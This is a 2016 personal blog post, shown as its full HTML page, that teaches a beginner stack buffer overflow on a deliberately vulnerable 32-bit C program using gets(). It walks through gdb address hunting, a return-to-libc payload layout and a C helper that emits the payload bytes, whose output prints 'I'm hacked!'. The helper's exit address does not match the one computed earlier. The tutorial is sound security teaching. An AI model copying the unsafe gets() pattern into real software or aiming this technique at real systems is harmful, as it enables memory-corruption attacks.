<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Pufan Jiang's personal blog, including lots of tech blogs, photo shooting etc.">
    <meta name="keyword"  content="tech | software">
    <link rel="shortcut icon" href="img/favicon.ico">

    <title>Secure Threats -- Buffer Overflow Attack -- Level 0 - Pufan Jiang | 江浦饭</title>

    <link rel="canonical" href="http://huangxuan.me/2016/02/14/Secure-Threats-Buffer-Overflow-Attack-Level-0/">

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/hux-blog.min.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="/css/syntax.css">

    <!-- Custom Fonts -->
    <!-- <link href="http://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
    <!-- Hux change font-awesome CDN to qiniu -->
    <link href="http://cdn.staticfile.org/font-awesome/4.2.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">


    <!-- Hux Delete, sad but pending in China
    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
    css'>
    -->


    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- ga & ba script hoook -->
    <script></script>
</head>


<!-- hack iOS CSS :active style -->
<body ontouchstart="">

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">Pufan Jiang's Blog</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <!-- Known Issue, found by Hux:
            <nav>'s height woule be hold on by its content.
            so, when navbar scale out, the <nav> will cover tags.
            also mask any touch event of tags, unfortunately.
        -->
        <div id="huxblog_navbar">
            <div class="navbar-collapse">
                <ul class="nav navbar-nav navbar-right">
                    <li>
                        <a href="/">Home</a>
                    </li>
                    
                    <li>
                        <a href="/about/">About Me</a>
                    </li>
                    
                    <li>
                        <a href="/tags/">Tags</a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>
<script>
    // Drop Bootstarp low-performance Navbar
    // Use customize navbar with high-quality material design animation
    // in high-perf jank-free CSS3 implementation
    var $body   = document.body;
    var $toggle = document.querySelector('.navbar-toggle');
    var $navbar = document.querySelector('#huxblog_navbar');
    var $collapse = document.querySelector('.navbar-collapse');

    $toggle.addEventListener('click', handleMagic)
    function handleMagic(e){
        if ($navbar.className.indexOf('in') > 0) {
        // CLOSE
            $navbar.className = " ";
            // wait until animation end.
            setTimeout(function(){
                // prevent frequently toggle
                if($navbar.className.indexOf('in') < 0) {
                    $collapse.style.height = "0px"
                }
            },400)
        }else{
        // OPEN
            $collapse.style.height = "auto"
            $navbar.className += " in";
        }
    }
</script>


    <!-- Image to hack wechat -->
<!-- <img src="/img/icon_wechat.png" width="0" height="0"> -->
<!-- <img src="/img/post-2016-02-11-poison-pill-pattern.jpg" width="0" height="0"> -->

<!-- Post Header -->
<style type="text/css">
    header.intro-header{
        background-image: url('/img/post-2016-02-11-poison-pill-pattern.jpg')
    }
</style>
<header class="intro-header" >
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <div class="tags">
                        
                        <a class="tag" href="/tags/#Buffer Overflow" title="Buffer Overflow">Buffer Overflow</a>
                        
                        <a class="tag" href="/tags/#Secure" title="Secure">Secure</a>
                        
                    </div>
                    <h1>Secure Threats -- Buffer Overflow Attack -- Level 0</h1>
                    
                    
                    <h2 class="subheading">Your first hacking attack</h2>
                    
                    <span class="meta">Posted by Pufan Jiang on February 14, 2016</span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">

    <!-- Post Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container">

				<p>This is a short series about secure system. The goal is to show readers that our software system is far from robust and safe, and hopefully you would keep this in mind. (We are all that easy to overlook security problems.)</p>

<p>This first several posts talk about a basic yet highly prevalent attack/hack solution to a software system that seems robust at first glance. This is called Buffer Overflow.</p>

<p><strong>Pre-requisite</strong> <br />
The first pre-requisite is quite easy to catch up, but the second and third ones are fundamental pre knowledge.</p>

<ol>
  <li>Familiar with C language. (This series would use C program as example.) And know how to use a <code>gdb</code> to debug C program.</li>
  <li>Familiar with basic assembly language and be able to read assembly language. (No need to good at writing them!)</li>
  <li>Know what’s a heap, stack, shared library and basically how program is mapped into memory. Or if you could understand what this figure is talking about.</li>
</ol>

<p><img src="http://i1371.photobucket.com/albums/ag320/otnt/ProgramMemoryOrganization_zpshdbibtlq.png" alt="Program Memory Organization" /> <br />
<em>(<a href="http://www.amazon.com/Computer-Systems-Programmers-Perspective-2nd/dp/0136108040/ref=sr_1_3?ie=UTF8&amp;qid=1454639716&amp;sr=8-3&amp;keywords=csapp">Computer System : A Programmer’s Perspective 2nd</a>)</em></p>

<h2 id="buffer-overflow-attack">Buffer Overflow Attack</h2>

<p>Great, now you are ready to hack a system, and I’m showing you a way.</p>

<h3 id="what-is-buffer-overflow">What is Buffer Overflow</h3>
<p>Buffer Overflow is an attack/hacking solution that takes advantage of such a vulnerability: when a victim host is trying to receive a message from an attacker, it doesn’t check the length of in-coming message, so the message could be arbitrary long and, as a result, overwrite some part of victim host’s  stack memory and make the hack.</p>

<h3 id="an-example-your-first-hacking-attack">An Example (Your first hacking attack!)</h3>

<p>To make this clearer, let’s see a typical example.</p>

<pre><code class="language-c">/* basic.c */
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

/* server code, I'm victim */
int main(int argc, char** argv)
{
    char buf[16] ;

    printf("Hi, I'm server.\n");
    gets(buf);
    printf("you entered: %s\n", buf);

    return 0;
}
</code></pre>

<p>This piece of code seems okay at first glance, but the reason it suffers from a buffer overflow attack is the use of this <code>gets</code> function. Basically <code>gets</code> copy string from standard input to <code>buf</code>. To understand why this is a problem, we need to look inside the program to know what is happening underneath. Yeah, I mean to read some assembly code.</p>

<p>By running following script,</p>

<pre><code class="language-shell">gcc -o basic basic.c -m32
objdump -d basic
</code></pre>
<p>we could get assembly code of <code>basic</code>. <br />
(<strong>Note we add a <code>-m32</code> here to compile it to a 32-bit version</strong>)</p>

<pre><code class="language-assembly">08048480 &lt;main&gt;:
 ......
 8048495:  8d 44 24 10        lea    0x10(%esp),%eax # some padding
 8048499:  89 04 24           mov    %eax,(%esp)  # put this address as argument for gets function
 804849c:  e8 9f fe ff ff     call   8048340 &lt;gets@plt&gt;
 ......
</code></pre>
<p>I’m not going to talk about what exactly these assembly do. They are pretty straightforward if you have some experience with assembly language and also notice I add some comments to help you catch the idea.</p>

<h4 id="now-is-key-point"><strong>Now is key point.</strong></h4>
<p>Then what <code>gets</code> function does is it go through standard input and copy byte by byte to <code>buf</code> until it met a <code>null</code> terminator. However, the <code>gets</code> function doesn’t check input length! So what if we input a very long sentence?</p>

<pre><code class="language-shell">-bash-4.2$ echo "a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence" | ./basic
Hi, I'm server.
you entered: a verrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrry long sentence
Segmentation fault (core dumped)
</code></pre>

<p>The problem is the input is too long so that it override some part of original stack. This could be a disaster since stack is used to keep important variable value.</p>

<p>And this is why this kind of attack is called Buffer Overflow Attack.</p>

<h2 id="to-do-a-real-attack">To do a real attack</h2>

<p>To do a real attack, i.e. let the program do something you intend it to do, rather than just crash, we need more work and more analysis.</p>

<h4 id="analysis"><strong>Analysis</strong></h4>

<p>By using <code>gdb</code></p>

<pre><code>(gdb) b *0x804849c
Breakpoint 1 at 0x804849c
(gdb) r
Starting program: basic 
Hi, I'm server.

Breakpoint 1, 0x0804849c in main ()
(gdb) i r esp
esp            0xffffd210       0xffffd210
(gdb) x/wx 0xffffd210
0xffffd210:     0xffffd220
</code></pre>

<p>we could find right before <code>gets</code>  is called, <code>esp</code> is pointing to <code>0xffffd220</code>, which means our input message will be written to this address. <br />
Also, if we set breakpoint at beginning of <code>main</code> function,</p>

<pre><code>(gdb) b *0x0x8048480
Breakpoint 2 at 0x8048480
(gdb) r
Starting program: basic
Breakpoint 2, 0x08048480 in main ()
(gdb) i r esp
esp            0xffffd23c       0xffffd23c
</code></pre>

<p>we could find return address for <code>main</code> function is saved at  <code>0xffffd23c</code>.</p>

<p>Did you find the secret? The offset between the return address and the address we are going to write is only <code>0xffffd23c - 0xffffd220 = 0x1C = 28</code>. This means if our input message is 28 characters or more, then we could overwrite the return address of <code>main</code> function!</p>

<p>And let’s remind what return instruction does. It puts the value pointed by <code>esp</code> to <code>eip</code>,  increment <code>esp</code> by 4 bytes, and execute the code pointed by <code>eip</code>. So this means if we change the value of return address, we could let program go to some surprised place and execute some surprised code!</p>

<p>Moreover, if we construct our input message using executable code and let the return address go to our code, then we could let program do whatever we want! And this closes our analysis! Bravo!</p>

<h4 id="sum-up"><strong>Sum up</strong></h4>
<p>Let’s put the pieces together. To do a basic buffer overflow attack, we need to…<br />
1.Find the address where your input message is going to write.<br />
2.Find the most recent return address that is larger than the address in point 1.<br />
3.Carefully calculate the offset of these two addresses and design your input message so that they could be executed by CPU to do some surprisingly fun job.</p>

<h4 id="lets-hack-our-not-so-robust-program"><strong>Let’s Hack Our ‘Not-so-Robust’ Program</strong></h4>
<p>The normal execution of <code>basic</code> program is prompt exactly same thing as we input. Now we would like it to print <code>I'm hacked!</code> in a funny way.</p>

<p>To print something, we still need the built-in <code>print</code> function in <code>stdlib</code>. Take a look at assembly code again,</p>

<pre><code>(gdb) p &amp;printf
$2 = (&lt;data variable, no debug info&gt; *) 0xf7e32f60 &lt;printf&gt;
</code></pre>

<p>To print something, we need to make sure <code>esp</code> is pointing to what we want to print (i.e. <code>I'm hacked!</code> in this case), and then call <code>printf</code> function! The input message should be like this:<br />
[several padding to return address] – [address to <code>printf</code>] – [pointer to hacking message]</p>

<p>To call the <code>printf</code> function is easy, we just need to overwrite the return address in <code>main</code> function with <code>printf</code> address, which we’ve already figured out as  <code>0xf7e32f60</code>.</p>

<p>Then where is the hacking message? Remember the <code>printf</code> function print message out until it find a <code>null</code> terminator. Therefore we could not put the hacking message at front of input message and followed by the padding, since in this way we would print rubbish that we don’t want to. So we have to put them at the end of input message. Thus, the input message should be like this:<br />
[several padding to return address] – [address to <code>printf</code>] – [pointer to hacking message] – [hacking message]</p>

<p>One last thing, we need some padding at after return to <code>printf</code>, this is because we use <code>printf</code> function not by “call” but by “return”. As we analyzed before, just before call <code>printf</code>, we make sure <code>esp</code> pointing to message we want to print out. But when we use “return” to call a function, it first put <code>esp</code> to <code>eip</code> and then pop <code>esp</code> so that <code>esp</code> will move up by 4 bytes. Also, the value in this padding is the return address after return from <code>printf</code>, i.e. the program will try to execute code at the position of this padding value. So we could put an <code>exit</code> here to let the program stop.</p>

<pre><code>(gdb) p &amp;exit
$5 = (&lt;text variable, no debug info&gt; *) 0xf7e17b10 &lt;exit&gt;
</code></pre>

<p>Okay! Let’s hack it!<br />
We know…<br />
1. The address we are going to write from is: <code>0xffffd220</code><br />
2. The original return address is at: <code>0xffffd23c</code><br />
3. The return address need to overwrite as <code>0xf7e32f60</code><br />
4. The exit address is <code>0xf7e17b10</code><br />
5. And we put hacking message at the end: <code>I'm hacked!</code></p>

<p>So, what we need is:<br />
<code>0xffffd220</code> : 28 <code>\x90</code> as padding<br />
……<br />
<code>0xffffd23c</code> : <code>0xf7e32f60</code> address to call <code>printf</code><br />
<code>0xffffd240</code> : <code>0xf7e17b10</code> address to exit, also as padding<br />
<code>0xffffd244</code> : <code>0xffffd248</code> pointer to printing message<br />
<code>0xffffd248</code> : <code>I'm hacked!</code></p>

<p>Another important thing we need to keep in mind is, our system is generally small-endian. This means instead of <code>0xf7e32f60</code> as is human readable, we need to put <code>0x602fe3f7</code> in our input message. The same thing holds to <code>0xffffd248</code> and <code>0xf7e17b10</code>.</p>

<p>So, based on all these analysis. We get our input message:<br />
28 <code>\x90</code>  <code>0x602fe3f7</code> <code>0x107be1f7</code> <code>0x48d2ffff</code> <code>I'm hacked!</code></p>

<p>To generate the text we could have a helper program <code>hack</code></p>

<pre><code class="language-c">/* basic hack.c */
#include &lt;stdio.h&gt;

int main(int argc, char** argv)
{
        int i = 0;
        //padding
        for(i = 0; i &lt; 28; i++)
        {
                printf("\x90");
        }
        printf("\x60\x2f\xe3\xf7");//address to printf
        printf("\xa1\x83\x04\x08");//address to exit
        printf("\x48\xd2\xff\xff");//address to print message
        printf("I'm Hacked!\n");

        return 0;
}
</code></pre>

<p>Then compile it and save to a file <code>hack.txt</code></p>

<pre><code class="language-shell">-bash-4.2$ gcc -o hack hack.c                                                                                      
-bash-4.2$ ./hack &gt; hack.txt
</code></pre>

<p>Finally use <code>gdb</code> to test it!</p>

<pre><code>(gdb) r &lt; hack.txt 
Starting program: basic &lt; hack.txt
Hi, I'm server.
you entered: ????????????????????????????`/{H?I'm Hacked!
I'm Hacked![Inferior 1 (process 41057) exited with code 0111]
</code></pre>
<p><strong>Note</strong> At the end of output, it says program exited with code 0111. This means program doesn’t exit normally. This is because the <code>exit</code> function also use <code>esp</code> as exit code, but in our program <code>esp</code> saves address to message. To overcome this problem, we need to use ROP(Return-Oriented-Programming) technique. See following posts!</p>

<p>Last but not least. If you test this attack without <code>gdb</code>, you’ll get</p>

<pre><code>-bash-4.2$ ./basic &lt; hack.txt 
Hi, I'm server.
you entered: ????????????????????????????`/{H?I'm Hacked!
Segmentation fault (core dumped)
</code></pre>
<p>This is because the so-called ASLR(Address Space Layout Randomization) defense technique. We’ll talk about how to overcome this defense in following posts.</p>

<p>And this ends the very basic Buffer Overflow Attack. Hope you enjoy it!</p>


                <hr>

                


                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2016/02/11/poison-pill-pattern/" data-toggle="tooltip" data-placement="top" title="Poison Pill Pattern">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2016/02/19/Talking-within-Distributed-System-Message-Passing-RPC-RESTful-and-Thrift/" data-toggle="tooltip" data-placement="top" title="Talking within Distributed System">Next Post &rarr;</a>
                    </li>
                    
                </ul>


                

                

            </div>

    <!-- Sidebar Container -->
            <div class="
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                sidebar-container">

                <!-- Featured Tags -->
                
                <section>
                    <hr class="hidden-sm hidden-xs">
                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
                    <div class="tags">
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
                				<a href="/tags/#Code Challenge" title="Code Challenge" rel="2">
                                    Code Challenge
                                </a>
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
                            
        				
        			</div>
                </section>
                

                <!-- Friends Blog -->
                
                <hr>
                <h5>FRIENDS</h5>
                <ul class="list-inline">
                    
                        <li><a href="http://blog.csdn.net/jiangfan2014">My CSDN Blog</a></li>
                    
                </ul>
                
            </div>
        </div>
    </div>
</article>








<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>
<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
<script>
    async("http://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
        anchors.options = {
          visible: 'always',
          placement: 'right',
          icon: '#'
        };
        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
    })
</script>
<style>
    /* place left on bigger screen */
    @media all and (min-width: 800px) {
        .anchorjs-link{
            position: absolute;
            left: -0.75em;
            font-size: 1.1em;
            margin-top : -0.1em;
        }
    }
</style>



    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    
                    

                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
                    
                    <li>
                        <a target="_blank" href="https://www.zhihu.com/people/jiangpufan">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa  fa-stack-1x fa-inverse">知</i>
                            </span>
                        </a>
                    </li>
                    
                    


                    
                    
                    <li>
                        <a target="_blank" href="https://github.com/otnt">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
                <p class="copyright text-muted">
                    Copyright &copy; Pufan Jiang's Blog 2016
                    <br>
                    Theme by <a href="http://huangxuan.me">Hux</a> |
                    <iframe
                        style="margin-left: 2px; margin-bottom:-5px;"
                        frameborder="0" scrolling="0" width="91px" height="20px"
                        src="https://ghbtns.com/github-btn.html?user=huxpro&repo=huxpro.github.io&type=star&count=true" >
                    </iframe>
                </p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="/js/jquery.min.js "></script>

<!-- Bootstrap Core JavaScript -->
<script src="/js/bootstrap.min.js "></script>

<!-- Custom Theme JavaScript -->
<script src="/js/hux-blog.min.js "></script>


<!-- async load function -->
<script>
    function async(u, c) {
      var d = document, t = 'script',
          o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
      s.parentNode.insertBefore(o, s);
    }
</script>

<!-- Highlight.js -->
<script>
    async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
        hljs.initHighlightingOnLoad();
    })
    // only load tagcloud.js in tag.html
    if($('#tag_cloud').length !== 0){
        async("/js/jquery.tagcloud.js",function(){
            $.fn.tagcloud.defaults = {
                //size: {start: 1, end: 1, unit: 'em'},
                color: {start: '#bbbbee', end: '#0085a1'},
            };
            $('#tag_cloud a').tagcloud();
        })
    }
</script>
<link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">

<!--fastClick.js -->
<script>
    async("http://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
        var $nav = document.querySelector("nav");
        if($nav) FastClick.attach($nav);
    })
</script>


<!-- Google Analytics -->

<script>
    // dynamic User by Hux
    var _gaId = 'UA-73727812-1';
    var _gaDomain = 'otnt.github.io';

    // Originial
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', _gaId, _gaDomain);
    ga('send', 'pageview');
</script>



<!-- Baidu Tongji -->




<!-- Image to hack wechat -->
<img src="/img/icon_wechat.png" width="0" height="0" />
<!-- Migrate from head to bottom, no longer block render and still work -->

</body>

</html>
